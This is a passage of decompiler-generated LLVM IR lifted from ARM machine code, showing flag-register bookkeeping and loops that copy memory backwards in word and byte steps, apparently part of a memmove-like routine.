  %v0_175dc37 = phi i32 [ %v2_175a8, %dec_label_pc_175bc ], [ %v0_176d020, %dec_label_pc_17680 ]
  %v0_175d836 = phi i32 [ %v2_175a4, %dec_label_pc_175bc ], [ %v0_17680, %dec_label_pc_17680 ]
  %v0_175c4 = phi i32 [ %v2_175ac, %dec_label_pc_175bc ], [ %v2_17678, %dec_label_pc_17680 ]
  %v2_175c4 = add i32 %v0_175c4, -8
  store i32 %v2_175c4, i32* %r2.global-to-local, align 4
  %v4_175c4 = sub i32 7, %v0_175c4
  %v5_175c4 = and i32 %v4_175c4, %v0_175c4
  %v6_175c4 = icmp slt i32 %v5_175c4, 0
  store i1 %v6_175c4, i1* %cpsr_v.global-to-local, align 1
  %v7_175c4 = icmp slt i32 %v2_175c4, 0
  store i1 %v7_175c4, i1* %cpsr_n.global-to-local, align 1
  %v8_175c4 = icmp eq i32 %v0_175c4, 8
  store i1 %v8_175c4, i1* %cpsr_z.global-to-local, align 1
  %v5_175c8 = icmp slt i32 %v0_175c4, 8
  br i1 %v5_175c8, label %dec_label_pc_17614, label %dec_label_pc_175cc

dec_label_pc_175cc:                               ; preds = %dec_label_pc_175c4
  %v3_175cc = load i32, i32* @r4, align 4
  %v5_175cc = inttoptr i32 %v3_175cc to i8*
  store i8* %v5_175cc, i8** %stack_var_-8, align 4
  %v8_175cc = load i32, i32* @lr, align 4
  %v2_175d0 = add i32 %v0_175c4, -28
  store i32 %v2_175d0, i32* %r2.global-to-local, align 4
  %v4_175d0 = sub i32 27, %v0_175c4
  %v5_175d0 = and i32 %v4_175d0, %v2_175c4
  %v6_175d0 = icmp slt i32 %v5_175d0, 0
  store i1 %v6_175d0, i1* %cpsr_v.global-to-local, align 1
  %v7_175d0 = icmp slt i32 %v2_175d0, 0
  store i1 %v7_175d0, i1* %cpsr_n.global-to-local, align 1
  %v8_175d0 = icmp eq i32 %v2_175c4, 20
  store i1 %v8_175d0, i1* %cpsr_z.global-to-local, align 1
  %v5_175d4 = icmp slt i32 %v2_175c4, 20
  br i1 %v5_175d4, label %dec_label_pc_175f0, label %dec_label_pc_175d8

dec_label_pc_175d8:                               ; preds = %dec_label_pc_175cc, %dec_label_pc_175d8.dec_label_pc_175d8_crit_edge
  %v0_175dc = phi i32 [ %v1_175e4, %dec_label_pc_175d8.dec_label_pc_175d8_crit_edge ], [ %v0_175dc37, %dec_label_pc_175cc ]
  %v0_175d8 = phi i32 [ %v0_175d8.pre, %dec_label_pc_175d8.dec_label_pc_175d8_crit_edge ], [ %v0_175d836, %dec_label_pc_175cc ]
  %v1_175d8 = add i32 %v0_175d8, -4
  %v2_175d8 = inttoptr i32 %v1_175d8 to i32*
  %v3_175d8 = load i32, i32* %v2_175d8, align 4
  %v4_175d8 = add i32 %v0_175d8, -8
  %v5_175d8 = inttoptr i32 %v4_175d8 to i32*
  %v6_175d8 = load i32, i32* %v5_175d8, align 4
  store i32 %v6_175d8, i32* %r4.global-to-local, align 4
  %v7_175d8 = add i32 %v0_175d8, -12
  %v8_175d8 = inttoptr i32 %v7_175d8 to i32*
  %v9_175d8 = load i32, i32* %v8_175d8, align 4
  store i32 %v9_175d8, i32* %ip.global-to-local, align 4
  %v10_175d8 = add i32 %v0_175d8, -16
  %v11_175d8 = inttoptr i32 %v10_175d8 to i32*
  %v12_175d8 = load i32, i32* %v11_175d8, align 4
  store i32 %v12_175d8, i32* %lr.global-to-local, align 4
  store i32 %v10_175d8, i32* %r1.global-to-local, align 4
  %v1_175dc = add i32 %v0_175dc, -16
  %v2_175dc = inttoptr i32 %v1_175dc to i32*
  store i32 %v3_175d8, i32* %v2_175dc, align 4
  %v4_175dc = add i32 %v0_175dc, -12
  %v5_175dc = inttoptr i32 %v4_175dc to i32*
  %v6_175dc = load i32, i32* %r4.global-to-local, align 4
  store i32 %v6_175dc, i32* %v5_175dc, align 4
  %v7_175dc = add i32 %v0_175dc, -8
  %v8_175dc = inttoptr i32 %v7_175dc to i32*
  %v9_175dc = load i32, i32* %ip.global-to-local, align 4
  store i32 %v9_175dc, i32* %v8_175dc, align 4
  %v10_175dc = add i32 %v0_175dc, -4
  %v11_175dc = inttoptr i32 %v10_175dc to i32*
  %v12_175dc = load i32, i32* %lr.global-to-local, align 4
  store i32 %v12_175dc, i32* %v11_175dc, align 4
  store i32 %v1_175dc, i32* %r0.global-to-local, align 4
  %v0_175e0 = load i32, i32* %r1.global-to-local, align 4
  %v1_175e0 = add i32 %v0_175e0, -4
  %v2_175e0 = inttoptr i32 %v1_175e0 to i32*
  %v3_175e0 = load i32, i32* %v2_175e0, align 4
  store i32 %v3_175e0, i32* @r3, align 4
  %v4_175e0 = add i32 %v0_175e0, -8
  %v5_175e0 = inttoptr i32 %v4_175e0 to i32*
  %v6_175e0 = load i32, i32* %v5_175e0, align 4
  store i32 %v6_175e0, i32* %r4.global-to-local, align 4
  %v7_175e0 = add i32 %v0_175e0, -12
  %v8_175e0 = inttoptr i32 %v7_175e0 to i32*
  %v9_175e0 = load i32, i32* %v8_175e0, align 4
  store i32 %v9_175e0, i32* @ip, align 4
  %v10_175e0 = add i32 %v0_175e0, -16
  %v11_175e0 = inttoptr i32 %v10_175e0 to i32*
  %v12_175e0 = load i32, i32* %v11_175e0, align 4
  store i32 %v12_175e0, i32* %lr.global-to-local, align 4
  store i32 %v10_175e0, i32* %r1.global-to-local, align 4
  %v1_175e4 = add i32 %v0_175dc, -32
  %v2_175e4 = inttoptr i32 %v1_175e4 to i32*
  store i32 %v3_175e0, i32* %v2_175e4, align 4
  %v4_175e4 = add i32 %v0_175dc, -28
  %v5_175e4 = inttoptr i32 %v4_175e4 to i32*
  %v6_175e4 = load i32, i32* %r4.global-to-local, align 4
  store i32 %v6_175e4, i32* %v5_175e4, align 4
  %v7_175e4 = add i32 %v0_175dc, -24
  %v8_175e4 = inttoptr i32 %v7_175e4 to i32*
  %v9_175e4 = load i32, i32* @ip, align 4
  store i32 %v9_175e4, i32* %v8_175e4, align 4
  %v10_175e4 = add i32 %v0_175dc, -20
  %v11_175e4 = inttoptr i32 %v10_175e4 to i32*
  %v12_175e4 = load i32, i32* %lr.global-to-local, align 4
  store i32 %v12_175e4, i32* %v11_175e4, align 4
  store i32 %v1_175e4, i32* %r0.global-to-local, align 4
  %v0_175e8 = load i32, i32* %r2.global-to-local, align 4
  %v2_175e8 = add i32 %v0_175e8, -32
  store i32 %v2_175e8, i32* %r2.global-to-local, align 4
  %v6_175ec = icmp slt i32 %v0_175e8, 32
  br i1 %v6_175ec, label %dec_label_pc_175f0.loopexit, label %dec_label_pc_175d8.dec_label_pc_175d8_crit_edge

dec_label_pc_175d8.dec_label_pc_175d8_crit_edge:  ; preds = %dec_label_pc_175d8
  %v0_175d8.pre = load i32, i32* %r1.global-to-local, align 4
  br label %dec_label_pc_175d8

dec_label_pc_175f0.loopexit:                      ; preds = %dec_label_pc_175d8
  %v4_175e8 = sub i32 31, %v0_175e8
  %v5_175e8 = and i32 %v4_175e8, %v0_175e8
  %v6_175e8 = icmp slt i32 %v5_175e8, 0
  %v7_175e8 = icmp slt i32 %v2_175e8, 0
  store i1 %v6_175e8, i1* %cpsr_v.global-to-local, align 1
  store i1 %v7_175e8, i1* %cpsr_n.global-to-local, align 1
  store i1 false, i1* %cpsr_z.global-to-local, align 1
  br label %dec_label_pc_175f0

dec_label_pc_175f0:                               ; preds = %dec_label_pc_175f0.loopexit, %dec_label_pc_175cc
  %v6_175f8 = phi i32 [ %v1_175e4, %dec_label_pc_175f0.loopexit ], [ %v0_175dc37, %dec_label_pc_175cc ]
  %v0_17600.pr = phi i32 [ %v2_175e8, %dec_label_pc_175f0.loopexit ], [ %v2_175d0, %dec_label_pc_175cc ]
  %v4_175f0 = add i32 %v0_17600.pr, 16
  %v6_175f0 = sub i32 0, %v0_17600.pr
  %v7_175f0 = and i32 %v4_175f0, %v6_175f0
  %v8_175f0 = icmp slt i32 %v7_175f0, 0
  store i1 %v8_175f0, i1* %cpsr_v.global-to-local, align 1
  %v9_175f0 = icmp slt i32 %v4_175f0, 0
  store i1 %v9_175f0, i1* %cpsr_n.global-to-local, align 1
  %v10_175f0 = icmp eq i32 %v4_175f0, 0
  store i1 %v10_175f0, i1* %cpsr_z.global-to-local, align 1
  %v5_175f4 = icmp slt i32 %v0_17600.pr, -16
  br i1 %v5_175f4, label %.thread2, label %bb147

bb147:                                            ; preds = %dec_label_pc_175f0
  %v6_175f4 = load i32, i32* %r1.global-to-local, align 4
  %v7_175f4 = add i32 %v6_175f4, -4
  %v8_175f4 = inttoptr i32 %v7_175f4 to i32*
  %v9_175f4 = load i32, i32* %v8_175f4, align 4
  store i32 %v9_175f4, i32* @r3, align 4
  %v10_175f4 = add i32 %v6_175f4, -8
  %v11_175f4 = inttoptr i32 %v10_175f4 to i32*
  %v12_175f4 = load i32, i32* %v11_175f4, align 4
  store i32 %v12_175f4, i32* %r4.global-to-local, align 4
  %v13_175f4 = add i32 %v6_175f4, -12
  %v14_175f4 = inttoptr i32 %v13_175f4 to i32*
  %v15_175f4 = load i32, i32* %v14_175f4, align 4
  store i32 %v15_175f4, i32* @ip, align 4
  %v16_175f4 = add i32 %v6_175f4, -16
  %v17_175f4 = inttoptr i32 %v16_175f4 to i32*
  %v18_175f4 = load i32, i32* %v17_175f4, align 4
  store i32 %v18_175f4, i32* %lr.global-to-local, align 4
  store i32 %v16_175f4, i32* %r1.global-to-local, align 4
  %v7_175f8 = add i32 %v6_175f8, -16
  %v8_175f8 = inttoptr i32 %v7_175f8 to i32*
  store i32 %v9_175f4, i32* %v8_175f8, align 4
  %v10_175f8 = add i32 %v6_175f8, -12
  %v11_175f8 = inttoptr i32 %v10_175f8 to i32*
  %v12_175f8 = load i32, i32* %r4.global-to-local, align 4
  store i32 %v12_175f8, i32* %v11_175f8, align 4
  %v13_175f8 = add i32 %v6_175f8, -8
  %v14_175f8 = inttoptr i32 %v13_175f8 to i32*
  %v15_175f8 = load i32, i32* @ip, align 4
  store i32 %v15_175f8, i32* %v14_175f8, align 4
  %v16_175f8 = add i32 %v6_175f8, -4
  %v17_175f8 = inttoptr i32 %v16_175f8 to i32*
  %v18_175f8 = load i32, i32* %lr.global-to-local, align 4
  store i32 %v18_175f8, i32* %v17_175f8, align 4
  store i32 %v7_175f8, i32* %r0.global-to-local, align 4
  %v6_175fc = load i32, i32* %r2.global-to-local, align 4
  %v7_175fc = add i32 %v6_175fc, -16
  store i32 %v7_175fc, i32* %r2.global-to-local, align 4
  br label %.thread2

.thread2:                                         ; preds = %dec_label_pc_175f0, %bb147
  %v6_17608 = phi i32 [ %v7_175f8, %bb147 ], [ %v6_175f8, %dec_label_pc_175f0 ]
  %v0_17600 = phi i32 [ %v7_175fc, %bb147 ], [ %v0_17600.pr, %dec_label_pc_175f0 ]
  %v4_17600 = add i32 %v0_17600, 20
  store i32 %v4_17600, i32* %r2.global-to-local, align 4
  %v6_17600 = sub i32 0, %v0_17600
  %v7_17600 = and i32 %v4_17600, %v6_17600
  %v8_17600 = icmp slt i32 %v7_17600, 0
  store i1 %v8_17600, i1* %cpsr_v.global-to-local, align 1
  %v9_17600 = icmp slt i32 %v4_17600, 0
  store i1 %v9_17600, i1* %cpsr_n.global-to-local, align 1
  %v10_17600 = icmp eq i32 %v4_17600, 0
  store i1 %v10_17600, i1* %cpsr_z.global-to-local, align 1
  %v5_17604 = icmp slt i32 %v0_17600, -20
  br i1 %v5_17604, label %.thread4, label %bb148

bb148:                                            ; preds = %.thread2
  %v6_17604 = load i32, i32* %r1.global-to-local, align 4
  %v7_17604 = add i32 %v6_17604, -4
  %v8_17604 = inttoptr i32 %v7_17604 to i32*
  %v9_17604 = load i32, i32* %v8_17604, align 4
  store i32 %v9_17604, i32* @r3, align 4
  %v10_17604 = add i32 %v6_17604, -8
  %v11_17604 = inttoptr i32 %v10_17604 to i32*
  %v12_17604 = load i32, i32* %v11_17604, align 4
  store i32 %v12_17604, i32* @ip, align 4
  %v13_17604 = add i32 %v6_17604, -12
  %v14_17604 = inttoptr i32 %v13_17604 to i32*
  %v15_17604 = load i32, i32* %v14_17604, align 4
  store i32 %v15_17604, i32* %lr.global-to-local, align 4
  store i32 %v13_17604, i32* %r1.global-to-local, align 4
  %v7_17608 = add i32 %v6_17608, -12
  %v8_17608 = inttoptr i32 %v7_17608 to i32*
  store i32 %v9_17604, i32* %v8_17608, align 4
  %v10_17608 = add i32 %v6_17608, -8
  %v11_17608 = inttoptr i32 %v10_17608 to i32*
  %v12_17608 = load i32, i32* @ip, align 4
  store i32 %v12_17608, i32* %v11_17608, align 4
  %v13_17608 = add i32 %v6_17608, -4
  %v14_17608 = inttoptr i32 %v13_17608 to i32*
  %v15_17608 = load i32, i32* %lr.global-to-local, align 4
  store i32 %v15_17608, i32* %v14_17608, align 4
  store i32 %v7_17608, i32* %r0.global-to-local, align 4
  %v6_1760c = load i32, i32* %r2.global-to-local, align 4
  %v7_1760c = add i32 %v6_1760c, -12
  store i32 %v7_1760c, i32* %r2.global-to-local, align 4
  br label %.thread4

.thread4:                                         ; preds = %.thread2, %bb148
  %v6_1762c45 = phi i32 [ %v6_17608, %.thread2 ], [ %v7_17608, %bb148 ]
  %v0_1761443 = phi i32 [ %v4_17600, %.thread2 ], [ %v7_1760c, %bb148 ]
  %v2_17610 = load i8*, i8** %stack_var_-8, align 4
  %v3_17610 = ptrtoint i8* %v2_17610 to i32
  store i32 %v3_17610, i32* @r4, align 4
  store i32 %v8_175cc, i32* @lr, align 4
  br label %dec_label_pc_17614

dec_label_pc_17614:                               ; preds = %dec_label_pc_175c4, %.thread4
  %v7_17624 = phi i32 [ %v0_175dc37, %dec_label_pc_175c4 ], [ %v6_1762c45, %.thread4 ]
  %v0_17614 = phi i32 [ %v2_175c4, %dec_label_pc_175c4 ], [ %v0_1761443, %.thread4 ]
  %v2_17614 = add i32 %v0_17614, 8
  store i32 %v2_17614, i32* %r2.global-to-local, align 4
  %v4_17614 = sub i32 0, %v0_17614
  %v5_17614 = and i32 %v2_17614, %v4_17614
  %v6_17614 = icmp slt i32 %v5_17614, 0
  store i1 %v6_17614, i1* %cpsr_v.global-to-local, align 1
  %v7_17614 = icmp slt i32 %v2_17614, 0
  store i1 %v7_17614, i1* %cpsr_n.global-to-local, align 1
  %v8_17614 = icmp eq i32 %v2_17614, 0
  store i1 %v8_17614, i1* %cpsr_z.global-to-local, align 1
  %v5_17618 = icmp slt i32 %v0_17614, -8
  br i1 %v5_17618, label %bb150, label %dec_label_pc_1761c

dec_label_pc_1761c:                               ; preds = %dec_label_pc_17614
  %v6_1761c = add i32 %v0_17614, 4
  store i32 %v6_1761c, i32* %r2.global-to-local, align 4
  %v8_1761c = sub i32 -5, %v0_17614
  %v9_1761c = and i32 %v8_1761c, %v2_17614
  %v10_1761c = icmp slt i32 %v9_1761c, 0
  store i1 %v10_1761c, i1* %cpsr_v.global-to-local, align 1
  %v11_1761c = icmp slt i32 %v6_1761c, 0
  store i1 %v11_1761c, i1* %cpsr_n.global-to-local, align 1
  %v12_1761c = icmp eq i32 %v2_17614, 4
  store i1 %v12_1761c, i1* %cpsr_z.global-to-local, align 1
  %v5_17620 = icmp slt i32 %v2_17614, 4
  %v6_17620 = load i32, i32* %r1.global-to-local, align 4
  %v7_17620 = add i32 %v6_17620, -4
  %v8_17620 = inttoptr i32 %v7_17620 to i32*
  %v9_17620 = load i32, i32* %v8_17620, align 4
  store i32 %v9_17620, i32* @r3, align 4
  br i1 %v5_17620, label %.thread8, label %bb149

.thread8:                                         ; preds = %dec_label_pc_1761c
  store i32 %v7_17620, i32* %r1.global-to-local, align 4
  %v8_17624 = add i32 %v7_17624, -4
  %v9_17624 = inttoptr i32 %v8_17624 to i32*
  store i32 %v9_17620, i32* %v9_17624, align 4
  %v10_17624 = load i32, i32* %r0.global-to-local, align 4
  %v11_17624 = add i32 %v10_17624, -4
  store i32 %v11_17624, i32* %r0.global-to-local, align 4
  %v0_17634.pre = load i32, i32* %r2.global-to-local, align 4
  br label %bb150

bb149:                                            ; preds = %dec_label_pc_1761c
  %v10_17628 = add i32 %v6_17620, -8
  %v11_17628 = inttoptr i32 %v10_17628 to i32*
  %v12_17628 = load i32, i32* %v11_17628, align 4
  store i32 %v12_17628, i32* @ip, align 4
  store i32 %v10_17628, i32* %r1.global-to-local, align 4
  %v7_1762c = add i32 %v7_17624, -8
  %v8_1762c = inttoptr i32 %v7_1762c to i32*
  store i32 %v9_17620, i32* %v8_1762c, align 4
  %v10_1762c = add i32 %v7_17624, -4
  %v11_1762c = inttoptr i32 %v10_1762c to i32*
  %v12_1762c = load i32, i32* @ip, align 4
  store i32 %v12_1762c, i32* %v11_1762c, align 4
  store i32 %v7_1762c, i32* %r0.global-to-local, align 4
  %v6_17630 = load i32, i32* %r2.global-to-local, align 4
  %v7_17630 = add i32 %v6_17630, -4
  store i32 %v7_17630, i32* %r2.global-to-local, align 4
  br label %bb150

bb150:                                            ; preds = %.thread8, %.thread14, %dec_label_pc_17614, %dec_label_pc_175a4, %dec_label_pc_177d8, %dec_label_pc_1776c, %dec_label_pc_17700, %bb149
  %v2_17638 = phi i32 [ %v11_17624, %.thread8 ], [ %v0_176d020, %.thread14 ], [ %v7_17624, %dec_label_pc_17614 ], [ %v2_175a8, %dec_label_pc_175a4 ], [ %v2_1764453, %dec_label_pc_177d8 ], [ %v2_1764452, %dec_label_pc_1776c ], [ %v2_1764451, %dec_label_pc_17700 ], [ %v7_1762c, %bb149 ]
  %v0_17634 = phi i32 [ %v0_17634.pre, %.thread8 ], [ %v2_17678, %.thread14 ], [ %v2_17614, %dec_label_pc_17614 ], [ %v2_175ac, %dec_label_pc_175a4 ], [ %v0_1763449, %dec_label_pc_177d8 ], [ %v0_1763448, %dec_label_pc_1776c ], [ %v0_1763447, %dec_label_pc_17700 ], [ %v7_17630, %bb149 ]
  %v1_17634 = add i32 %v0_17634, 4
  store i32 %v1_17634, i32* %r2.global-to-local, align 4
  %v3_17634 = sub i32 0, %v0_17634
  %v4_17634 = and i32 %v1_17634, %v3_17634
  %v5_17634 = icmp slt i32 %v4_17634, 0
  store i1 %v5_17634, i1* %cpsr_v.global-to-local, align 1
  %v6_17634 = icmp slt i32 %v1_17634, 0
  store i1 %v6_17634, i1* %cpsr_n.global-to-local, align 1
  %v7_17634 = icmp eq i32 %v1_17634, 0
  store i1 %v7_17634, i1* %cpsr_z.global-to-local, align 1
  br i1 %v7_17634, label %.thread130, label %bb151

bb151:                                            ; preds = %bb150
  %v1_1763c = add i32 %v0_17634, 2
  %v3_1763c = sub i32 -3, %v0_17634
  %v4_1763c = and i32 %v3_1763c, %v1_17634
  %v5_1763c = icmp slt i32 %v4_1763c, 0
  store i1 %v5_1763c, i1* %cpsr_v.global-to-local, align 1
  %v6_1763c = icmp slt i32 %v1_1763c, 0
  store i1 %v6_1763c, i1* %cpsr_n.global-to-local, align 1
  %v7_1763c = icmp eq i32 %v1_17634, 2
  store i1 %v7_1763c, i1* %cpsr_z.global-to-local, align 1
  %v0_17640 = load i32, i32* %r1.global-to-local, align 4
  %v1_17640 = add i32 %v0_17640, -1
  %v2_17640 = inttoptr i32 %v1_17640 to i8*
  %v3_17640 = load i8, i8* %v2_17640, align 1
  %v4_17640 = zext i8 %v3_17640 to i32
  store i32 %v4_17640, i32* @r3, align 4
  store i32 %v1_17640, i32* %r1.global-to-local, align 4
  %v3_17644 = add i32 %v2_17638, -1
  %v4_17644 = inttoptr i32 %v3_17644 to i8*
  store i8 %v3_17640, i8* %v4_17644, align 1
  %v5_17644 = load i32, i32* %r0.global-to-local, align 4
  %v6_17644 = add i32 %v5_17644, -1
  store i32 %v6_17644, i32* %r0.global-to-local, align 4
  %v0_17648 = load i1, i1* %cpsr_n.global-to-local, align 1
  %v1_17648 = load i1, i1* %cpsr_v.global-to-local, align 1
  %v2_17648 = xor i1 %v0_17648, %v1_17648
  br i1 %v2_17648, label %.thread129, label %bb152

bb152:                                            ; preds = %bb151
  %v3_17648 = load i32, i32* %r1.global-to-local, align 4
  %v4_17648 = add i32 %v3_17648, -1
  %v5_17648 = inttoptr i32 %v4_17648 to i8*
  %v6_17648 = load i8, i8* %v5_17648, align 1
  %v7_17648 = zext i8 %v6_17648 to i32
  store i32 %v7_17648, i32* @r3, align 4
  store i32 %v4_17648, i32* %r1.global-to-local, align 4
  %v6_1764c = add i32 %v5_17644, -2
  %v7_1764c = inttoptr i32 %v6_1764c to i8*
  store i8 %v6_17648, i8* %v7_1764c, align 1
  %v8_1764c = load i32, i32* %r0.global-to-local, align 4
  %v9_1764c = add i32 %v8_1764c, -1
  store i32 %v9_1764c, i32* %r0.global-to-local, align 4
  %v1_17650.pre = load i1, i1* %cpsr_n.global-to-local, align 1
  %v2_17650.pre = load i1, i1* %cpsr_v.global-to-local, align 1
  br label %.thread129

.thread129:                                       ; preds = %bb151, %bb152
  %v7_17654 = phi i32 [ %v9_1764c, %bb152 ], [ %v6_17644, %bb151 ]
  %v2_17654 = phi i1 [ %v2_17650.pre, %bb152 ], [ %v1_17648, %bb151 ]
  %v1_17654 = phi i1 [ %v1_17650.pre, %bb152 ], [ %v0_17648, %bb151 ]
  %v0_17650 = load i1, i1* %cpsr_z.global-to-local, align 1
  %v3_17650 = xor i1 %v2_17654, %v1_17654
  %v4_17650 = or i1 %v0_17650, %v3_17650
  br i1 %v4_17650, label %.thread130, label %bb153

bb153:                                            ; preds = %.thread129
  %v5_17650 = load i32, i32* %r1.global-to-local, align 4
  %v6_17650 = add i32 %v5_17650, -1
  %v7_17650 = inttoptr i32 %v6_17650 to i8*
  %v8_17650 = load i8, i8* %v7_17650, align 1
  %v9_17650 = zext i8 %v8_17650 to i32
  store i32 %v9_17650, i32* @r3, align 4
  store i32 %v6_17650, i32* %r1.global-to-local, align 4
  %v8_17654 = add i32 %v7_17654, -1
  %v9_17654 = inttoptr i32 %v8_17654 to i8*
  store i8 %v8_17650, i8* %v9_17654, align 1
  %v10_17654 = load i32, i32* %r0.global-to-local, align 4
  %v11_17654 = add i32 %v10_17654, -1
  store i32 %v11_17654, i32* %r0.global-to-local, align 4
  br label %.thread130

dec_label_pc_1765c:                               ; preds = %dec_label_pc_175b4
  store i1 false, i1* %cpsr_v.global-to-local, align 1
  %v8_1765c = icmp eq i32 %v1_175b4, 1
  store i1 %v8_1765c, i1* %cpsr_n.global-to-local, align 1
  %v9_1765c = icmp eq i32 %v1_175b4, 2
  store i1 %v9_1765c, i1* %cpsr_z.global-to-local, align 1
  %v1_17660 = add i32 %v2_175a4, -1
  %v2_17660 = inttoptr i32 %v1_17660 to i8*
  %v3_17660 = load i8, i8* %v2_17660, align 1
  %v4_17660 = zext i8 %v3_17660 to i32
  store i32 %v4_17660, i32* @r3, align 4
  store i32 %v1_17660, i32* %r1.global-to-local, align 4
  %v3_17664 = add i32 %v2_175a8, -1
  %v4_17664 = inttoptr i32 %v3_17664 to i8*
  store i8 %v3_17660, i8* %v4_17664, align 1
  %v5_17664 = load i32, i32* %r0.global-to-local, align 4
  %v6_17664 = add i32 %v5_17664, -1
  store i32 %v6_17664, i32* %r0.global-to-local, align 4
  br i1 %v8_1765c, label %.thread14, label %bb154

bb154:                                            ; preds = %dec_label_pc_1765c
  %v6_17668 = load i32, i32* %r1.global-to-local, align 4
  %v7_17668 = add i32 %v6_17668, -1
  %v8_17668 = inttoptr i32 %v7_17668 to i8*
  %v9_17668 = load i8, i8* %v8_17668, align 1
  %v10_17668 = zext i8 %v9_17668 to i32
  store i32 %v10_17668, i32* @r3, align 4
  store i32 %v7_17668, i32* %r1.global-to-local, align 4
  %v9_1766c = add i32 %v5_17664, -2
  %v10_1766c = inttoptr i32 %v9_1766c to i8*
  store i8 %v9_17668, i8* %v10_1766c, align 1
  %v11_1766c = load i32, i32* %r0.global-to-local, align 4
  %v12_1766c = add i32 %v11_1766c, -1
  store i32 %v12_1766c, i32* %r0.global-to-local, align 4
  br i1 %v9_1765c, label %.thread14, label %bb155

bb155:                                            ; preds = %bb154
  %v8_17670 = load i32, i32* %r1.global-to-local, align 4
  %v9_17670 = add i32 %v8_17670, -1
  %v10_17670 = inttoptr i32 %v9_17670 to i8*
  %v11_17670 = load i8, i8* %v10_17670, align 1
  %v12_17670 = zext i8 %v11_17670 to i32
  store i32 %v12_17670, i32* @r3, align 4
  store i32 %v9_17670, i32* %r1.global-to-local, align 4
  %v11_17674 = add i32 %v11_1766c, -2
  %v12_17674 = inttoptr i32 %v11_17674 to i8*
  store i8 %v11_17670, i8* %v12_17674, align 1
  %v13_17674 = load i32, i32* %r0.global-to-local, align 4
  %v14_17674 = add i32 %v13_17674, -1
  store i32 %v14_17674, i32* %r0.global-to-local, align 4
  br label %.thread14

.thread14:                                        ; preds = %bb154, %dec_label_pc_1765c, %bb155
  %v0_176d020 = phi i32 [ %v12_1766c, %bb154 ], [ %v6_17664, %dec_label_pc_1765c ], [ %v14_17674, %bb155 ]
  %v0_17678 = load i32, i32* %r2.global-to-local, align 4
  %v1_17678 = load i32, i32* @ip, align 4
  %v2_17678 = sub i32 %v0_17678, %v1_17678
  store i32 %v2_17678, i32* %r2.global-to-local, align 4
  %v4_17678 = xor i32 %v1_17678, %v0_17678
  %v5_17678 = xor i32 %v2_17678, %v0_17678
  %v6_17678 = and i32 %v5_17678, %v4_17678
  %v7_17678 = icmp slt i32 %v6_17678, 0
  store i1 %v7_17678, i1* %cpsr_v.global-to-local, align 1
  %v8_17678 = icmp slt i32 %v2_17678, 0
  store i1 %v8_17678, i1* %cpsr_n.global-to-local, align 1
  %v9_17678 = icmp eq i32 %v0_17678, %v1_17678
  store i1 %v9_17678, i1* %cpsr_z.global-to-local, align 1
  %v5_1767c = icmp slt i32 %v0_17678, %v1_17678
  br i1 %v5_1767c, label %bb150, label %dec_label_pc_17680

dec_label_pc_17680:                               ; preds = %.thread14
  %v0_17680 = load i32, i32* %r1.global-to-local, align 4
  %v1_17680 = urem i32 %v0_17680, 4
  store i32 %v1_17680, i32* @ip, align 4
  store i1 false, i1* %cpsr_n.global-to-local, align 1
  %v2_17680 = icmp eq i32 %v1_17680, 0
  store i1 %v2_17680, i1* %cpsr_z.global-to-local, align 1
  br i1 %v2_17680, label %dec_label_pc_175c4, label %dec_label_pc_17688

dec_label_pc_17688:                               ; preds = %dec_label_pc_175bc, %dec_label_pc_17680
  %v0_176d019 = phi i32 [ %v2_175a8, %dec_label_pc_175bc ], [ %v0_176d020, %dec_label_pc_17680 ]
  %v0_1777c = phi i32 [ %v2_175ac, %dec_label_pc_175bc ], [ %v2_17678, %dec_label_pc_17680 ]
  %v0_17688 = phi i32 [ %v2_175a4, %dec_label_pc_175bc ], [ %v0_17680, %dec_label_pc_17680 ]
  %v0_17690 = phi i32 [ %v1_175bc, %dec_label_pc_175bc ], [ %v1_17680, %dec_label_pc_17680 ]
  %v1_17688 = and i32 %v0_17688, -4
  store i32 %v1_17688, i32* %r1.global-to-local, align 4
  %v1_1768c = inttoptr i32 %v1_17688 to i32*
  %v2_1768c = load i32, i32* %v1_1768c, align 4
  store i32 %v2_1768c, i32* @r3, align 4
  %v7_17690 = icmp ult i32 %v0_17690, 2
  %v2_17774 = add i32 %v0_1777c, -12
  %v4_17774 = sub i32 11, %v0_1777c
  %v5_17774 = and i32 %v4_17774, %v0_1777c
  %v6_17774 = icmp slt i32 %v5_17774, 0
  store i1 %v6_17774, i1* %cpsr_v.global-to-local, align 1
  %v7_17774 = icmp slt i32 %v2_17774, 0
  store i1 %v7_17774, i1* %cpsr_n.global-to-local, align 1
  %v8_17774 = icmp eq i32 %v0_1777c, 12
  store i1 %v8_17774, i1* %cpsr_z.global-to-local, align 1
  %v5_17778 = icmp slt i32 %v0_1777c, 12
  br i1 %v7_17690, label %dec_label_pc_17774, label %dec_label_pc_17698

dec_label_pc_17698:                               ; preds = %dec_label_pc_17688
  %v8_17690 = icmp eq i32 %v0_17690, 2
  br i1 %v8_17690, label %dec_label_pc_17708, label %dec_label_pc_1769c

dec_label_pc_1769c:                               ; preds = %dec_label_pc_17698
  br i1 %v5_17778, label %dec_label_pc_176e8, label %dec_label_pc_176a4

dec_label_pc_176a4:                               ; preds = %dec_label_pc_1769c
  store i32 %v2_17774, i32* %r2.global-to-local, align 4
  %v3_176a8 = load i32, i32* @r4, align 4
  store i32 %v3_176a8, i32* %stack_var_-12, align 4
  %v6_176a8 = load i32, i32* @r5, align 4
  %v8_176a8 = inttoptr i32 %v6_176a8 to i8*
  store i8* %v8_176a8, i8** %stack_var_-8, align 4
  %v11_176a8 = load i32, i32* @lr, align 4
  br label %dec_label_pc_176ac

dec_label_pc_176ac:                               ; preds = %dec_label_pc_176ac.dec_label_pc_176ac_crit_edge, %dec_label_pc_176a4
  %v0_176d0 = phi i32 [ %v1_176d0, %dec_label_pc_176ac.dec_label_pc_176ac_crit_edge ], [ %v0_176d019, %dec_label_pc_176a4 ]
  %v0_176b0 = phi i32 [ %v0_176b0.pre, %dec_label_pc_176ac.dec_label_pc_176ac_crit_edge ], [ %v1_17688, %dec_label_pc_176a4 ]
  %v0_176ac = phi i32 [ %v0_176ac.pre, %dec_label_pc_176ac.dec_label_pc_176ac_crit_edge ], [ %v2_1768c, %dec_label_pc_176a4 ]
  %v3_176ac = mul i32 %v0_176ac, 256
  store i32 %v3_176ac, i32* %lr.global-to-local, align 4
  %v1_176b0 = add i32 %v0_176b0, -4
  %v2_176b0 = inttoptr i32 %v1_176b0 to i32*
  %v3_176b0 = load i32, i32* %v2_176b0, align 4
  store i32 %v3_176b0, i32* @r3, align 4
  %v4_176b0 = add i32 %v0_176b0, -8
  %v5_176b0 = inttoptr i32 %v4_176b0 to i32*
  %v6_176b0 = load i32, i32* %v5_176b0, align 4
